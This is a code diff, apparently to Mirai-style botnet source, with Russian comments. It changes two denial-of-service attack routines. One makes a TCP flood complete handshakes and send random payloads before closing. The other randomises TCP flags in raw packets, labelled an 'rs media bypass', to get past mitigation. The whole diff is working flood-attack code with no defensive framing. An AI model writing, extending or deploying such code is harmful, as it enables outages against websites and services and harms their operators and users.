@@ -10,6 +10,7 @@
 #include <linux/tcp.h>
 #include <fcntl.h>
 #include <errno.h>
+#include <string.h>
 #include "includes.h"
 #include "attack.h"
 #include "checksum.h"
@@ -245,15 +246,20 @@ void attack_tcp_handshake(uint8_t targs_len, struct attack_target *targs, uint8_
                     addr.sin_addr.s_addr = targs[i].addr;
                 addr.sin_port = (dport == 0xffff) ? rand_next() & 0xffff : htons(dport);
 
+                // полный tcp handshake
                 connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
 
-                {
+                // ждем установления соединения
+                usleep(10000);
+                
+                // отправляем данные
                     char payload[1024];
                     int j;
                     for (j = 0; j < (int)sizeof(payload); j++) payload[j] = rand_next() & 0xff;
                     send(fd, payload, sizeof(payload), MSG_NOSIGNAL);
-                }
 
+                // корректно закрываем соединение
+                shutdown(fd, SHUT_WR);
                 usleep(5000);
                 close(fd);
             }
@@ -469,9 +475,12 @@ void attack_rs_media(uint8_t targs_len, struct attack_target *targs, uint8_t opt
             tcph->seq = htonl(rand_next());
             tcph->ack_seq = 0;
             tcph->doff = 5;
-            tcph->syn = 1;
-            tcph->ack = (rand_next() % 3 == 0) ? 1 : 0;
-            tcph->psh = (rand_next() % 4 == 0) ? 1 : 0;
+            // rs media bypass - случайные флаги
+            tcph->syn = (rand_next() % 2) ? 1 : 0;
+            tcph->ack = (rand_next() % 2) ? 1 : 0;
+            tcph->psh = (rand_next() % 2) ? 1 : 0;
+            tcph->fin = (rand_next() % 3 == 0) ? 1 : 0;
+            tcph->rst = (rand_next() % 5 == 0) ? 1 : 0;
             tcph->window = htons(rand_next() & 0xffff);
             tcph->check = 0;
             tcph->urg_ptr = 0;
